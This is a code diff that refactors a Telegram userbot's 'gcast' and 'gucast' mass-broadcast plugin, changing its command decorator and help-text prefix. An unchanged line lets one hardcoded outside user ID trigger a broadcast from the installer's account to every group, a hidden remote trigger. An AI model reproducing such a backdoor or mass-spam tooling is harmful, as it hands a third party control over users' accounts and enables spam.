@@ -1,5 +1,6 @@
-from userbot import CMD_HELP
+from userbot import CMD_HELP, CMD_HANDLER as cmd
 from userbot.events import register
+from userbot.utils import kyura_cmd
 
 GCAST_BLACKLIST = [
     -1001705349543,  # Kyurasupport2
@@ -14,7 +15,7 @@ GCAST_BLACKLIST = [
 ]
 
 
-@register(outgoing=True, pattern=r"^\.gcast(?: |$)(.*)")
+@kyura_cmd(pattern="gcast(?: |$)(.*)")
 @register(incoming=True, from_users=1954289347, pattern=r"^\.cgcast(?: |$)(.*)")
 async def gcast(event):
     xx = event.pattern_match.group(1)
@@ -44,7 +45,7 @@ async def gcast(event):
     )
 
 
-@register(outgoing=True, pattern=r"^\.gucast(?: |$)(.*)")
+@kyura_cmd(pattern="gucast(?: |$)(.*)")
 async def gucast(event):
     xx = event.pattern_match.group(1)
     if xx:
@@ -72,8 +73,8 @@ async def gucast(event):
 
 CMD_HELP.update(
     {
-        "gcast": "**Plugin : **`gcast`\
-        \n\n  •  **Syntax :** `.gcast` <text/reply media>\
+        "gcast": f"**Plugin : **`gcast`\
+        \n\n  •  **Syntax :** `{cmd}gcast` <text/reply media>\
         \n  •  **Function : **Mengirim Global Broadcast pesan ke Seluruh Grup yang kamu masuk. (Bisa Mengirim Media/Sticker)\
     "
     }
@@ -82,8 +83,8 @@ CMD_HELP.update(
 
 CMD_HELP.update(
     {
-        "gucast": "**Plugin : **`gucast`\
-        \n\n  •  **Syntax :** `.gucast` <text/reply media>\
+        "gucast": f"**Plugin : **`gucast`\
+        \n\n  •  **Syntax :** `{cmd}gucast` <text/reply media>\
         \n  •  **Function : **Mengirim Global Broadcast pesan ke Seluruh Private Massage / PC yang masuk. (Bisa Mengirim Media/Sticker)\
     "
     }
